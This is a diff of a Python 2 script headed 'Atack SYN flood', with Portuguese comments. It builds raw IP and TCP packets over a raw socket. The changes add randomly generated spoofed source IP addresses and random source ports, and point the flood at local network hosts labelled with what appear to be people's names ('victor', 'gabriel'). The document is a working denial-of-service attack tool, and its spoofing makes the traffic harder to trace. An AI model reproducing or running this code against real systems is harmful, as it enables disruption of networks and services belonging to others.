@@ -3,7 +3,7 @@
 # Atack SYN flood
 
 
-import socket, sys
+import socket, sys, random
 from struct import *
  
 # checksum functions needed for calculation checksum
@@ -35,8 +35,13 @@ s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
 packet = '';
  
 #atacando proprio roteador
-source_ip = '192.168.0.18'
-dest_ip = '192.168.0.1' # or socket.gethostbyname('www.google.com')
+
+#gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
+#para evitar que sejam todos 255 ou tenha 0.0.0.0
+source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
+print 'IP aleatorio gerado: ', source_ip
+dest_ip = '192.168.0.101' # victor
+#dest_ip = '192.168.0.1' # gabriel
  
 # ip header fields
 ihl = 5
@@ -57,7 +62,8 @@ ihl_version = (version << 4) + ihl
 ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
  
 # tcp header fields
-source = 8793   # source port
+source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
+print 'Porta aleatoria gerada: ', source
 dest = 80   # destination port
 seq = 0
 ack_seq = 0
